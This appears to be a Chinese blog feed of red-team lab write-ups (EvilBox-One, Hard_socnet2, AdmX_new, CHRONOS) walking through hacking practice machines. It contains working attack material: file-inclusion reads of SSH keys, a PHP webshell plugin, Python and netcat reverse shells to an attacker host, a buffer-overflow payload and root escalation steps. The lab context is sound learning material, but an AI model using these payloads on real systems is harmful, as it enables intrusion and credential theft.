<p>发现 &#x2F;secret 目录下存在一个 evil.php 文件，这里<strong>访问页面还是为空，右键查看源代码也为空</strong>。那就继续尝试对此php的<strong>执行参数进行爆破</strong>（这个可能比较少见，但试试）。先新建参数值字典：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi val.txt #将(1 2 3 a b c &#x27; &quot; ( &lt; , ; ? / %)作为字典值，换行写入</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAN -w val.txt:VAL -u http://10.0.2.9/secret/evil.php?PARAN=VAL -fs 0</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/08.png" class title="This is an example image">



<p>第一次尝试没爆破出结果，那尝试参数包含文件，即<strong>尝试包含服务器本地存在的文件</strong>，即 index.html</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/09.png" class title="This is an example image">



<p>可以看到存在 command 参数，疑似存在包含漏洞，访问以下链接效果相同，说明确实存在文件包含漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../index.html </span><br><span class="line">http://10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/10.png" class title="This is an example image">



<p>那尝试远程文件包含，即在本机新建 shell.php，让目标在远程加载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=http://10.0.2.4/shell.php</span><br></pre></td></tr></table></figure>



<p>无果，推测此文件包含漏洞属于本地文件包含，并不能远程包含文件。</p>
<p>那现在的思路是使用 php 语言支持的封装器，就是各种请求协议，比如 data、php、file、zip等。先用 php 协议尝试读取当前漏洞文件源码，此处需把源码转换成 Base64 读取，不然 php 源码会直接被解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/11.png" class title="This is an example image">



<p>解码获得 evil.php 源码，确实存在文件包含漏洞</p>
<img src="/2022/11/23/EvilBox-One/12.png" class title="This is an example image">



<p>这里想着能否用 php 协议写入文件，尝试访问，直接404，应该是没有写入权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>



<p><strong>0x05 本地文件读取&amp;SSH密钥破解</strong></p>
<p>继续尝试，想起这个文件包含漏洞是针对本地的，那么可以用于文件读取，尝试读取 <strong>&#x2F;etc&#x2F;passwd</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/13.png" class title="This is an example image">



<p>成功读取并看到有一个非系统账户 mowree 有 bash 权限。想起目标开放了 SSH 登录服务，并且支持密钥登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v  # -v 参数打印登录详细信息</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/14.png" class title="This is an example image">



<p>补充一下：密钥登录是，客户生成 SSH 公私钥，把公钥放在服务器上，私钥放在本机，两者用于登录验证，但默认配置，公私钥是在服务器上的。</p>
<p>那现在的思路就变为，是否能够利用文件包含漏洞，读取公钥、私钥信息，用于直接登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa#私钥，本地用于登录认证</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/15.png" class title="This is an example image">



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../home/mowree/.ssh/authorized_keys#公钥，放在服务器上</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/16.png" class title="This is an example image">



<p>把私钥复制到本地，新建 id_rsa 文件，赋予600权限，太大太小都不行，尝试登录：</p>
<img src="/2022/11/23/EvilBox-One/17.png" class title="This is an example image">



<p>好吧~，人家对私钥进行了加密，还需要另外的密码才能使用这个！</p>
<p>但这里确实是个突破点，就只能继续尝试爆破了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制本机破解字典</span></span><br><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">转换密钥格式，便于工具破解</span></span><br><span class="line">/usr/share/john/ssh2john.py /home/kali/Desktop/tool/id_rsa &gt; /home/kali/Desktop/tool/hash </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解私钥加密密码</span></span><br><span class="line">john hash --worlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/18.png" class title="This is an example image">



<p>成功登录~</p>
<img src="/2022/11/23/EvilBox-One/19.png" class title="This is an example image">



<p><strong>0x06 提权到 root</strong></p>
<p>常见提权手段来一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l # 无 sudo 权限配置不当</span><br><span class="line">uname -a # 无可利用内核提权漏洞</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/20.png" class title="This is an example image">



<p>那就找找有没有 suid 或 sgid 配置不当的文件，发现只有默认的系统文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null #搜索权限配置不当，屏蔽错误信息 suid-4000 sgid-2000</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/21.png" class title="This is an example image">



<p>那就再找找有没有配置不当的可读写文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc | grep -v sys | grep -v tmp #过滤部分文件前缀</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/22.png" class title="This is an example image">



<p>可看到当前用户对 &#x2F;etc&#x2F;passwd 居然有读写权限。&#x2F;etc&#x2F;passwd文件只存在账号列表及对应的权限，对应的密码文件存储在 &#x2F;etc&#x2F;shadow 文件，只有 root 能读写。但如果能直接修改 &#x2F;etc&#x2F;passwd文件，就可以直接覆盖 root 密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 #生成加密密码</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/23.png" class title="This is an example image">



<p>成功登录</p>
<img src="/2022/11/23/EvilBox-One/24.png" class title="This is an example image">]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>Hard_socnet2</title>
    <url>/2022/11/12/hard-socnet2/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8 </span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/03.png" class title="This is an example image">

<p>得到基本信息，ubuntu，python2，apache</p>
<p><strong>0x04 服务识别</strong></p>
<p>访问 8000 端口，提示请求方式不支持</p>
<img src="/2022/11/12/hard-socnet2/04.png" class title="This is an example image">



<p>那就把八种请求方式全部试一遍。OPTIONS、HEAD、GET、POST、PUT、DELETE、TRACE、CONNECT。最终也只有POST请求返回信息有些许不同。</p>
<img src="/2022/11/12/hard-socnet2/05.png" class title="This is an example image">



<p>根据返回信息可以看到，提示 xml 解析报错，元素为空，猜测应该是服务端对外提供的 api，但具体调用格式还不清楚，先换个点，收集多点信息。</p>
<p><strong>0x05 后台图片上传 &amp; SQL注入</strong></p>
<p>访问默认 80 端口。有个 Pynch 系统，有个登录框和注册框，并且登录账号为邮箱。</p>
<img src="/2022/11/12/hard-socnet2/06.png" class title="This is an example image">



<p>真实渗透场景下需要收集目标相关的邮箱信息，再构造字典尝试登录。但由于目标在此目标没发现什么邮箱信息，那就直接注册个账号进去看看吧。</p>
<img src="/2022/11/12/hard-socnet2/07.png" class title="This is an example image">



<p>可以看到，此系统类似博客，每个人都可以留言，其中有 admin 账户的留言信息，表示后台已经运行了一个 monitor.py 监控程序，应该是伏笔，先记着。</p>
<p>经过后续测试发现两个突破口。第一个是个人信息的头像图片上传，存在任意文件上传。那就好办了，直接上蚁剑。</p>
<img src="/2022/11/12/hard-socnet2/08.png" class title="This is an example image">



<p>第二个是搜索框存在SQL注入。使用sqlmap注入尝试。</p>
<img src="/2022/11/12/hard-socnet2/09.png" class title="This is an example image">



<p>尝试读取用户表的信息。这里的信息是用于登录系统后台，登录admin后台并没有发现更多的功能点，暂时搁置。根据获得密码登录SSH，无果。</p>
<img src="/2022/11/12/hard-socnet2/10.png" class title="This is an example image">



<p><strong>0x06 尝试提权到 sudo 用户</strong></p>
<p>由于现在蚁剑获得了一个普通的权限，尝试提权。提权思路通常为：</p>
<ol>
<li><p>内核提权，uname -a</p>
<p>这个后面再讲，不符合当时靶机作者的思路。</p>
</li>
<li><p>sudo 提权</p>
<p>当前用户没有执行 sudo 相关程序的权限。</p>
</li>
<li><p>suid 权限配置不当，通过执行高权限用户文件得到高权限。</p>
<p>暂无找到 suid 相关的执行文件存在漏洞。</p>
</li>
</ol>
<p>来一波信息收集吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/11.png" class title="This is an example image">



<p>有 bash 权限的 socnet 存在主目录，并且其他组用户有查看权限，赶紧进去瞧瞧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /home</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/12.png" class title="This is an example image">



<p>可以看到有个monitor.py，想起之前的在系统后台看到管理员说过，后台已经开启了 monitor ，查看是否开启。可以看到程序确实已经启动。</p>
<img src="/2022/11/12/hard-socnet2/13.png" class title="This is an example image">



<p>查看 monitor.py。这个文件有这么几个点：</p>
<ol>
<li>在 8000 端口开启了一个 XMLRPC 服务</li>
<li>随机生成一个1000到9999的数字，用于后续验证</li>
<li>定义了5个函数，其中四个为执行固定命令，一个为执行外部传输的指令，但前提是随机数正确</li>
</ol>
<img src="/2022/11/12/hard-socnet2/14.png" class title="This is an example image">



<p>另外 XMLRPC 就是通过解析 XML 格式的数据去执行功能点。</p>
<img src="/2022/11/12/hard-socnet2/15.png" class title="This is an example image">



<p>这样的话就有思路了，能否爆破出随机数，进而执行代码呢！</p>
<img src="/2022/11/12/hard-socnet2/16.png" class title="This is an example image">



<p>执行后爆破出来的随机数是 8793</p>
<img src="/2022/11/12/hard-socnet2/17.png" class title="This is an example image">



<p>修改代码，尝试进行命令执行。成功！</p>
<img src="/2022/11/12/hard-socnet2/18.png" class title="This is an example image">



<p>拿到了有 bash 权限的 socnet 用户，看看有没有相关提权漏洞，木的</p>
<img src="/2022/11/12/hard-socnet2/19.png" class title="This is an example image">



<p><strong>0x07 逆向工程 &amp; 动态调试 提权</strong></p>
<p><strong>提权</strong>的寻常思路不管用，那就继续信息收集吧。查看当前用户主目录下的文件信息，其中 monitor.py 为开启 XMLRPC 服务的文件，第一个文件 add_record，为 32 位的可执行程序，而且文件还有 setuid, setgid 属性。这就意味着，如果这个程序能够执行反弹 shell，那反弹的就是 root 权限。</p>
<img src="/2022/11/12/hard-socnet2/20.png" class title="This is an example image">



<p>第三个是 peda 目录，其实就是一个让 linux 自带的 <strong>GDB</strong> 显示得更友好，就是 GDB 的一个插件。而 GDB 是Linux下用来调试程序的，这一切仿佛都在暗示第一个可执行程序有问题。</p>
<img src="/2022/11/12/hard-socnet2/21.png" class title="This is an example image">



<p>说到可执行程序漏洞，往往就是栈溢出，原理就是输入异常数据，使得数据溢出到其他寄存器，导致可执行任意代码。</p>
<p>我们先来看看 add_record 这个程序的功能，运行试试。可以看到总共有五个输入点，Employee Name，Year worked，Salary，in trouble，Explain。</p>
<img src="/2022/11/12/hard-socnet2/22.png" class title="This is an example image">



<p>使用 gdb 进行运行调试。尝试在每个输入点注入相同字符，如果字符溢出到其他寄存器则存在缓冲区溢出漏洞。直接python打印A字符用于输入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;A&#x27;*500)&quot;</span></span><br></pre></td></tr></table></figure>



<p>开始 gdb 运行调试（第一个输入点，正常退出）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record  #安静模式启动调试程序</span><br><span class="line">r #正常执行程序</span><br><span class="line">AAA... #输入字符验证溢出</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/23.png" class title="This is an example image">



<p>那就挨个输入点调试，在最后一个点触发了不正常退出。可以看到A字符被填充到其他寄存器里。</p>
<img src="/2022/11/12/hard-socnet2/24.png" class title="This is an example image">



<p>重点需要关注的是EIP寄存器，这是指令寄存器，放的是CPU下一条要执行指令的地址。可以看到这里EIP寄存器也被A字符填充了，如果我们能够控制shellcode的代码放在EIP中，那么CPU就会去执行。所以现在我们需要定位，测试时的500个字符中填充到EIP是哪部分。</p>
<p>这里用 gdb 内置的功能生成100字符，特点是每四个字符不同。便于我们定位EIP的填充字段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">pattern create 100</span></span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/25.png" class title="This is an example image">



<p>之后执行 <code>pattern search</code> ，可以看到EIP对应的偏移为62，意味着从第63个字符开始就会进入EIP。</p>
<img src="/2022/11/12/hard-socnet2/26.png" class title="This is an example image">



<p>生成测试字符串，前62个字符为A，后面为BCDE，可以看到BCDE顺利被填充进EIP寄存器。这里需要说明一下，BCDE字符在内存中是倒过来存储的，存储为EDCB。即0x45444342对应的为EDCB，后续我们指定地址的时候要注意。</p>
<img src="/2022/11/12/hard-socnet2/27.png" class title="This is an example image">



<p>输入 <code>disas main</code> 进行汇编分析，其中@plt为系统内置的函数</p>
<img src="/2022/11/12/hard-socnet2/28.png" class title="This is an example image">



<p>有个 vuln 函数引起了注意，这名字明显不对头，而且这是在主程序中加载的，也就说默认执行程序时就已经执行了这函数，进去瞧瞧 <code>disas vuln</code>。</p>
<img src="/2022/11/12/hard-socnet2/29.png" class title="This is an example image">



<p>可以看到 vuln 函数中执行了 strcpy 内置函数，这函数已经披露过有缓冲区溢出漏洞，也就是说溢出后，<strong>我们可以指定任意内存地址跳转</strong>。</p>
<p>查看当前程序使用的函数列表 <code>info func</code>。其中 system 函数用于执行系统命令，setuid用于申请root权限，</p>
<img src="/2022/11/12/hard-socnet2/30.png" class title="This is an example image">



<p>还有个 backdoor 函数，这怎么看都很可疑，<code>disas backdoor</code>进去看看，system函数是在这里面调用的~</p>
<img src="/2022/11/12/hard-socnet2/31.png" class title="This is an example image">



<p>理一下思路，程序运行时自动加载 <code>vuln</code> 函数，其中调用了 <code>strcpy</code> ，导致其存在溢出漏洞，我们可以把 EIP 指向 <strong>backdoor</strong> 函数，因为里面执行了 setuid，和 system 函数。先尝试看看会执行成什么样，构造 payload，前62个字符为A，后续接上十六进制的 <code>backdoor</code> 地址，要倒着写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import struct; print(&#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/32.png" class title="This is an example image">



<p>可以看到，在输入 <code>backdoor</code>函数里调用 system 自动执行了 &#x2F;bin&#x2F;bash，而且在之前还执行了 setuid 。因此，生成 payload，第一个参数a，第二个参数1，第三个参数1，第四个参数1，第五个参数为62个A加上 backdoor的地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import struct; print(&#x27;a\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>



<p>执行 cat payload - | .&#x2F;add_record</p>
<img src="/2022/11/12/hard-socnet2/33.png" class title="This is an example image">



<p><strong>0x08 内核提权</strong></p>
<p>其实这台主机可以直接用 CVE-2021-3493 提权到 root，但因为靶机发布在此漏洞之前，作者应该是没想到这种情况。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令执行反弹shell</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.7 3333 &gt;/tmp/f</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过python优化交互的shell</span></span><br><span class="line">python -c &quot;import pty; pty,spawn(&#x27;/bin/bash) &lt;les$ python  -c &quot;import pty; pty,spawn(&#x27;/bin/bash)&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>AdmX_new</title>
    <url>/2022/11/05/AdmX-new/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/01.png" class title="This is an example image">

<p>前 1-4 为虚拟机占用的IP，靶机IP为 10.0.2.7</p>
<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.7</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/03.png" class title="This is an example image">



<p><strong>0x04 web服务探测</strong></p>
<p>靶机只开放了 80 端口，尝试访问</p>
<img src="/2022/11/05/AdmX-new/04.png" class title="This is an example image">

<p>尝试路径爆破（使用 feroxbuster 或 dirsearch 都可以 ，字典使用的 kali 内置）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.7 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>

<p>扫描结果，出现了很多 wordpress 字样，可以判断网站用的 wordpress 框架</p>
<img src="/2022/11/05/AdmX-new/06.png" class title="This is an example image">



<p>访问登录页面，可以看到页面持续加载</p>
<img src="/2022/11/05/AdmX-new/07.png" class title="This is an example image">



<p>抓个包看看</p>
<img src="/2022/11/05/AdmX-new/09.png" class title="This is an example image">



<p>可以看到在第一个请求的响应体里有多个 192.168.159.145 地址，下面的请求都是从第一个请求的响应体里发出，但由于请求不成功才导致页面的卡顿。尝试让页面加载时的请求全部指向本机。配置如下：</p>
<img src="/2022/11/05/AdmX-new/10.png" class title="This is an example image">



<p>类似于访问国外网站失败，重定向到国内镜像网站。也可用浏览器插件 Redirector  实现重定向。</p>
<p>burp 中配置的 Response header &amp; Response body。</p>
<p>现在再访问试试，正常显示。</p>
<img src="/2022/11/05/AdmX-new/11.png" class title="This is an example image">



<p><strong>0x05 暴力破解 &amp; 后台命令执行</strong></p>
<p>尝试默认账号密码登录，失败了，但确定有 admin 账户。</p>
<img src="/2022/11/05/AdmX-new/12.png" class title="This is an example image">



<p>尝试密码爆破，这时候就看字典强大与否了，毕竟wp的漏洞利用基本都要登录后台。其实这里也可以使用 kali 自带的 wpscan，但需要代理请求，设置IP转发，所以暂时先没用，试试能不能爆破出来密码。</p>
<img src="/2022/11/05/AdmX-new/13.png" class title="This is an example image">



<p>成功登录后台，Wordpress Version 5.7.1</p>
<img src="/2022/11/05/AdmX-new/14.png" class title="This is an example image">



<p>后台 getshell | 命令注入的思路一般为：<br>1、Mdedia——上传软件包<br>2、Appearance——编辑页面主题 例如：404Template.php，插入恶意代码<br>3、Plugins——上传自定义恶意插件，压缩成zip、 激活插件</p>
<p>操作上，自定义插件是最灵活的。创建 exp.php 文件，代码如下，格式必须固定：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">Description: mu</span></span><br><span class="line"><span class="comment">Author: myname</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>压缩成 zip 格式才能上传，上传后记得激活才能生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip exp.zip exp.php</span><br></pre></td></tr></table></figure>

<p>访问插件路径（建议下载目标框架源码看看各种对外路径）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.7/wordpress/wp-content/plugins/exp.php?cmd=id</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/15.png" class title="This is an example image">



<p>能够执行命令后，收集环境信息，如果能够直接执行 php 或是 python 那就反弹 shell ，如果有长度限制的话就反弹个 nc。查找命令可以看到有 Python3 环境。 </p>
<img src="/2022/11/05/AdmX-new/16.png" class title="This is an example image">



<p>执行 pyhton 反弹 shell 命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/17.png" class title="This is an example image">



<p><strong>0x06 一次提权</strong></p>
<p>可以看到当前为普通权限，由于当前没有bash权限，也执行不了sudo查看是否有配置不当。先查看内核信息，无提权可用</p>
<img src="/2022/11/05/AdmX-new/18.png" class title="This is an example image">



<p>WP 框架要记得去看配置信息，wp-config.php</p>
<img src="/2022/11/05/AdmX-new/19.png" class title="This is an example image">



<p>查看当前系统有什么账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/20.png" class title="This is an example image">



<p>可以直接知道 MySQL 用户 <code>admin</code> 和密码 <code>Wp_Admin#123</code>，但登录数据库报错。切换用户也报错。试了下之前登录的密码 adam14，成功切换到 wpadmin 账户。</p>
<img src="/2022/11/05/AdmX-new/21.png" class title="This is an example image">



<p>在 &#x2F;home&#x2F;wpadmin 下拿到了第一个flag</p>
<img src="/2022/11/05/AdmX-new/22.png" class title="This is an example image">



<p><strong>0x07 二次提权</strong></p>
<p>执行 sudo -l </p>
<img src="/2022/11/05/AdmX-new/23.png" class title="This is an example image">

<p>可使用 root 用户 执行 mysql 操作，而 mysql 中是有 system这个函数的，由于之前尝试 WP 配置文件中的密码错误，那么就再尝试一开始的登录密码 adam14，提权步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、sudo /usr/bin/mysql -u root -D wordpress -p #密码adam14</span><br><span class="line">2、\! /bin/bash #切换到 root 权限的命令行</span><br></pre></td></tr></table></figure>

<p>读取 root 目录下的 flag</p>
<img src="/2022/11/05/AdmX-new/24.png" class title="This is an example image">



<p><strong>0x08 出现的意外及注意点</strong></p>
<p>1、不知为何，我这边的反弹 shell 都是不带用户名的，因此命令执行是否成功也不知道，就像这样。</p>
<img src="/2022/11/05/AdmX-new/25.png" class title="This is an example image">

<p>2、通常遇到 wordpress 框架，首先识别版本号，但由于此目标网站下的识别文件已移除，无法直接地识别。另一方面就是采用 wpscan 进行扫描，由访问有问题就没有直接使用了。</p>
<p>3、应该维持多个权限，通过某一处命令执行后，通常会多点上线，比如上线 CS 、MSF、定时任务反弹、写入恶意 DLL等。这里其实也可以直接使用 MSF 上线的。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>CHRONOS</title>
    <url>/2022/10/29/CHRONOS/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建议在实际子网掩码减8</span></span><br><span class="line">sudo netdiscover -r 10.0.2.0/16  </span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/03.png" class title="This is an example image">



<p><strong>0x04 Web页面探查</strong></p>
<img src="/2022/10/29/CHRONOS/04.png" class title="This is an example image">

<p>针对Web页面通常有两种思路：</p>
<p>1、爆破路径</p>
<p>此处爆破无果，不是403就是301，也许是自带的字典不够强大吧。</p>
<p>2、查看源码</p>
<p>右键查看网页源码，发现 js 脚本有点猫腻。</p>
<img src="/2022/10/29/CHRONOS/06.png" class title="This is an example image">

<p>此处80和8000端口的源码是一样的，猜想是 js 搞的鬼，这里js代码被混淆了用在线网站格式化查看</p>
<p>推荐使用 cyberchef，效果如下</p>
<img src="/2022/10/29/CHRONOS/07.png" class title="This is an example image">

<p>可以看到 js 中有个地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>



<p><strong>0x05 编码&amp;命令注入</strong></p>
<p>抓个包看看：</p>
<img src="/2022/10/29/CHRONOS/08.png" class title="This is an example image">

<p>可以看到，页面发出了两个请求，其中一个域名解析失败，而目标机的8000端口是开放的，猜测此处的域名解析IP应该为目标机本机，那么就试试配置本地的hosts，让整个域名指向目标机。</p>
<img src="/2022/10/29/CHRONOS/09.png" class title="This is an example image">

<p>重新访问页面，请求加载成功</p>
<img src="/2022/10/29/CHRONOS/10.png" class title="This is an example image">

<p>单独抓取新访问请求查看参数和请求</p>
<img src="/2022/10/29/CHRONOS/11.png" class title="This is an example image">

<p>发现format参数疑似编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>

<p>cyberchef 自动识别试试</p>
<img src="/2022/10/29/CHRONOS/12.png" class title="This is an example image">

<p>可以看到识别出编码为 Base58 ，解码内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>疑似 linux bash 命令 ，猜测后端应该执行编码指令</p>
<p>尝试编码堆叠注入</p>
<img src="/2022/10/29/CHRONOS/13.png" class title="This is an example image">

<p>存在注入漏洞</p>
<img src="/2022/10/29/CHRONOS/14.png" class title="This is an example image">



<p><strong>0x06 反弹shell &amp; 信息收集</strong></p>
<p>既然有命令注入直接尝试 nc 反弹，经尝试，靶机上的 nc 没有 -e 参数，用 nc 串联的方式反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | 10.0.2.4 5555</span><br></pre></td></tr></table></figure>

